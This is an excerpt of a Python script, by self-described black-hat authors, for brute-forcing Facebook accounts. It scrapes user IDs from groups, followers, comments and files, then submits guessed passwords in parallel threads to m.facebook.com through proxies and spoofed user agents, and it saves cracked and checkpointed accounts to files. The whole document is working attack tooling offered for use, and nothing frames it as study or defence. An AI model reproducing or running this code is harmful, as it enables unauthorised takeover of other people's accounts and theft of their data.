...
###---[ MENTAL ROMEO X ARNOLD HARDY ]---###
#----[ 🌝MR ERROR ]-----#
AUTHOR = 'ARNOLD HARDY'
'AKASH BLACK HAT'
TEAM = 'AKASH X ARNOLD X CHUZA'
FACEBOOK = 'MENTAL ROMEO & ARNOLD HARDY'
version = 'MR ERROR.1'
...
{K}
   {M}•{K}•{H}• {P} ARNOLD'S MULTI BRUTE FORCE FACEBOOK {H}•{K}•{M}•""")
def logo2():
	return str(f"""
...
\_| |_/\_| \_\_| \_/\___/\_____/___/                                                                           
{K}
{M}>{K}>{H}> {P}OPENING ARNOLD TOOL {H}>{K}>{M}>""")

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "october", "November", "december"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "october", "11": "November", "12": "december"}
now = datetime.now()
hari = now.day
blx = now.month
try:
...
for t in range(10000):
	...
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.79'
...
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; Android 11; SM-A305FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36'
...
except:sys.exit(f" [{M}>{P}] fail dump proxy")
...
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}<{P}] login with cookies\n cookie : ")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 seperti Mac OS X)  AppleWebKit/605.1.15 (KHTML, like Gecko) Versi/11.0 CriOS/94.0.4606.85  Mobile/15E148 Safari/604.1", "referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "october", "November", "december"][datetime.now().month - 1]
...
def menu(n,t,c):
	...
	print(f" [{hh}02{P}] CRACK MULTI PUBLIC     [{hh}08{P}] CRACK FROM FILE")
	...
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_PUBLIC(t,c)
...
def cek_opsi_cp():
	...
	except:sys.exit(f" [{M}>{P}] ARNOLD cp")
	for x in ok:
		nom.append(x)
		no+=1
...
def cek_akun():
	...
	except:sys.exit(f" [{M}>{P}] ARNOLD ok")
	for x in ok:
		nom.append(x)
		no+=1
...
def cek_hasil():
	...
	if one in ['1','01']:
		...
		except:sys.exit(f" [{M}>{P}] file ARNOLD ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		...
		except:sys.exit(f" [{M}>{P}] file ARNOLD cp")
		print(kk+buka+P)
	else:sys.exit(f" [{M}>{P}] isi yang benar")
...
def clon_email():
	...
	doma = input(' domain @gail.com, @yahoo.com,etc : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] input domain yang')
	MENTAL = input(' total  : ')
	for xyz in range(int(MENTAL)):
		A = nama
...
def crack_file():
	file = input(f' [{hh}<{P}] input file name\n file : ')
	try:
...
def get_komen(url):
	...
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			...
			print(f'\r  dumping {len(dump)} id ',end='');sys.stdout.flush()
...
def crack_masal(t,c):
    ...
    for bz in range(apa):
    	...
    	try:
    		...
    		print(f"\r [{kk}!{P}] PUBLIC IDS       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{hh}<{P}] sure the account PUBLIC \n akun : ')
	try:
...
def crack_group():
	link = input(f' [{hh}<{P}] SURE PUBLIC ACCOUNT \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] fail dump group')
	atur_atur()
...
def atur_atur():
	...
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] COMBINE [{hh}3{P}] DEFAULT best : ')
...
def manual():
	...
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input  password 6 word \n password  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' account ok di : {sim_ok}\n account cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] ARNOLD OK:{ok} MENTAL CP:{cp} ')
...
def gabung():
	...
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input password 6 word\n password  : ').split(',')
	C = input(f' [{hh}>{P}] input password last name\n password  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] ONE WORD BACK PASSWORD")
	print(f"{P} ─────────────────────────────")
	print(f' account ok di : {ARNOLD_ok}\n Account cp di : {MENTAL_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
	...
	try:
		...
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			...
			if(len(sesi(res))==0):
				...
				akun += f'\n [{kk}>{P}] there is a {len(option)} option :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
